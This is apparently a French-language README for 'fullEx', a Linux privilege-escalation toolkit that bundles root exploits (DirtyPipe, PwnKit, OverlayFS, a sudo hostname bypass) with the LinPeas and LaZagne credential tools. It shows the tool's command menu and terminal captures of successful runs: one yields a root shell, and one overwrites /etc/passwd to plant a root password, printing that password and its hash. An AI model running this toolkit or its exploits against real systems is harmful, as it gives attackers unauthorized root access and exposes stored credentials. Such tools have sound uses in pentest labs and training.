# <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


Les exploits root & outils dispo :

💀 DirtyPipe

💀 Sudo Host

💀 OverlayFS

💀 PwnKit

🤖 LinPeas

👾 LaZagne

# ⚙️ Commandes

```
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Commands:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne
   -Overlays      Compilation + execution binaire - CVE-2015-1328
   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -DirtyPipe     DirtyPipe - CVE-2022-0847
   -SudoHost      Sudo Hostname - CVE-2025-32462   
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution '/fullEx'
   -help          Affiche les commandes
 ```
# 💀 SudoHost

```
vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
[+] Sudo Host Bypass Exploit - CVE-2025-32462
[+] Discovered by: Rich Mirch
[+] Exploit by: J3rich0123
[+] Target: Linux x86_64
[+] Starting pseudo-root shell on dev.
[+] Type 'exit' or 'quit' to leave.
[+] For a real shell, type: bash
[+] Or: vim → :!bash to break into a real TTY shell
root@dev# bash -i
root@metasploitable3-ub1404:~/fullEx# id
uid=0(root) gid=0(root) groups=0(root)
```
# 💀 DirtyPipe

```
www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
./fullEx.sh -DirtyPipe
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 131 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
[Dirty Pipe] Program execution completed successfully.
root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
```
